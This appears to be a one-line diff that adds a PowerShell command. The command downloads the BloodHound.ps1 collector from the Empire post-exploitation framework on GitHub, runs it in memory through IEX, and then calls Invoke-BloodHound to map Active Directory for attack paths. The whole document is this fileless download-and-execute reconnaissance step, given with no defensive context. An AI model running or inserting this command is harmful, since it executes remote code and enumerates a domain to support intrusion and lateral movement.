@@ -1,0 +1,1 @@
+IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/BloodHound.ps1’) ; Invoke-BloodHound
